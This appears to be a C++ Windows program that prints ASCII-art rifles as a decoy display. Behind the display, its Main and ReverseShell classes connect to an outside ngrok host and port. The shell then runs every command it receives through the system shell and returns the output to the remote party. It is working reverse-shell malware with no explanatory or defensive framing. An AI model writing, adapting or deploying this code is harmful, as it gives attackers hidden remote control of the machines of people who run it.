///BISMILLAH
///Author:Md Sajibur Rahman
///Dept.of Computer Science & Engineering(CSE)
///Faculty of Engineering
///University of Barishal(BU)


#include<bits/stdc++.h>
#include<windows.h>
#define ll long long
#define pb push_back
#define MX 100005
#define do {
#define done }
#define read std::cin>>
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size)(void)memset((p),0,(size))
#define fast ios::sync_with_stdio(false);
#define ct cin.tie(nullptr);

using namespace std;

int sock;
class Hacking{
 public:
};


class Shape:public Hacking{
public:
        Shape()
        {
                system("color 0A");
    std::cout << R"(
        ______
       |\_______________ (_____\\______________
HH======#H###############H#######################
       ' ~""""""""""""""`##(_))#H\"""""Y########
                         ))    \#H\       `"Y###
                         "      }#H)

        [ AKM Rifle Ready for Console Deployment ]
    )" << std::endl;




    std::cout << R"(
        +--^----------,--------,-----,--------^-,
        | |||||||||   `--------'     |          O
        `+---------------------------^----------|
          `\_,---------,---------,--------------'
            / XXXXXX /'|       /'
           / XXXXXX /  `\    /'
          / XXXXXX /`-------'
         / XXXXXX /
        / XXXXXX /
       (________(
        `------'
    )" << std::endl;


    std::cout << R"(
        +-‘~`---------------------------------/\--
        ||"""""""""""""""""""""""""""""""" \\\\\\  \/~)
        ||                                  \\\\\\  \/_
         |~~~~~~~~-________________-_________________\ ~--_
         !---------|_________       ------~~~~~(--   )--~~
                         \ /~~~~\~~\   )--- \_ /(
                          ||     |  | \   ()   \\
                          \\____/_ / ()\        \\
                           `~~~~~~~~~-. \        \\
                                       \ \  <($)> \\
                                        \ \        \\
                                         \ \        \\
                                          \ \        \\
                                           \ \  ()    \|
                                           _\_\__====~~~
    )" << std::endl;

        std::cout << R"(
    .-----------------TTTT_-----_______
                       /''''''''''(______O] ----------____  \______/]_
    __...---'"""\_ --''   Q                               ___________@
|'''                   ._   _______________=---------"""""""
|                ..--''|   l L |_l   |
|          ..--''      .  /-___j '   '
|    ..--''           /  ,       '   '
|--''                /           `    \
                     L__'         \    -
                                   -    '-.
                                    '.    /
                                      '-./
    )" << std::endl;


     std::cout << R"(
        ____    _     __     _    ____
                                     |####`--|#|---|##|---|#|--'##|#|
   _                                 |____,--|#|---|##|---|#|--.__|_|
 _|#)_____________________________________,--'EEEEEEEEEEEEEE'_=-.
((_____((_________________________,--------[JW](___(____(____(_==)        _________
                               .--|##,----o  o  o  o  o  o  o__|/`---,-,-'=========`=+==.
                               |##|_Y__,__.-._,__,  __,-.___/ J \ .----.#############|##|
                               |##|              `-.|#|##|#|`===l##\   _\############|##|
                              =======-===l          |_|__|_|     \##`-"__,=======.###|##|
                                                                  \__,"          '======'
    )" << std::endl;



     std::cout << R"(
                              |            |
                              |____________|

 ______________________________||________||___
[_______________________,----------._ [====]o'""-,__....----=====
                  [____(oooooooooooo)___________/__________     |
           sniper rifle //""""""""""  |====| [_)Krogg98    \    |
                       // \\          |====|                \   |
                      //   \\         |====|                """"
                     (_)   (_)
    )" << std::endl;


        }



};
class ReverseShell:public Hacking{
public:
        void Shell()
        {
            char buffer[MX];
            char container[MX];
            char total_response[MX];
            while(1)
            {
                bzero(buffer,sizeof(buffer));
                bzero(container,sizeof(container));
                bzero(total_response,sizeof(total_response));
                recv(sock,buffer,sizeof(buffer),0);

                FILE *fp=_popen(buffer,"r");
                while(fgets(container,sizeof(container),fp)!=NULL)
                {
                    strcat(total_response,container);
                }
                send(sock,total_response,sizeof(total_response),0);
                fclose(fp);
            }
        }
};

class Main:public ReverseShell{
public:
        Main()
        {
           WSADATA wsaData;
           struct sockaddr_in x;
           const char *ip="0.tcp.ap.ngrok.io";
           ll port=11175;

           WSAStartup(MAKEWORD(2,0),&wsaData);
           sock=socket(AF_INET,SOCK_STREAM,0);
           bzero(&x,sizeof(x));

           x.sin_family=AF_INET;
           x.sin_port=htons(port);

           struct hostent *host;
           host = gethostbyname(ip);
           x.sin_addr = *((struct in_addr *)host->h_addr);

           while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
               Sleep(10);
            }
           Shell();
        }

};



start_
do

   fast;
   ct;
   Shape *sp=new Shape();
   Main *mn=new Main();



   finish
done
